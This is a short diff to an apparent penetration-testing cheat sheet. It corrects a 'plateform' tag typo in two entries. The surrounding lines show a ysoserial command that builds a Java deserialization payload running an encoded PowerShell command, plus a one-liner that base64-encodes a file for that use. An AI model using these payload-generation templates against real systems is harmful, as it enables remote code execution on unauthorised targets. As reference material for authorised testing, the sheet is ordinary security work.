@@ -3,7 +3,7 @@
 % java, unserialize 
 
 ## ysoserial java - generate payload
-#plateform/linux #target/local #cat/ATTACK/GENERATE_PAYLOAD 
+#platform/linux #target/local #cat/ATTACK/GENERATE_PAYLOAD 
 
 https://github.com/frohoff/ysoserial
 
@@ -12,7 +12,7 @@ java -jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_en
 ```
 
 ## convert file to base64 one line
-#plateform/linux #target/local #cat/UTILS 
+#platform/linux #target/local #cat/UTILS 
 
 ```bash
 iconv -f ASCII -t UTF-16LE <file_to_convert> | base64 | tr -d "\n"
